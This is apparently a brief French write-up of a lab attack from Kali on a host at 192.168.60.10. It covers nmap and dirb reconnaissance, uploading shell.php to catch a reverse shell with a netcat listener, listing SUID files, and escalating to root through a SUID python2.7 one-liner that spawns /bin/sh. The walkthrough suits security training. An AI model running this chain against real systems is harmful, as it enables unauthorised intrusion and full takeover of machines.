# Attaque depuis kali:

## Reconnaissance
> nmap 192.168.60.0/24
Visite du site web, on trouve que le serveur utilise php
> dirb http://192.168.60.10/
> dirb http://192.168.60.10/ -X .php
## Reverse shell
Upload de shell.php dans /upload.php
Attente du reverse shell depuis kali:
> nc -nlvp 9001
Ouvrir shell.php dans /uploads
## Escalade de privilèges
Trouver les fichiers avec SUID d'activé:
> find / -perm -u=s -type f 2>/dev/null
Utiliser python pour l'escalade:
> cd /usr/bin
> ./python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
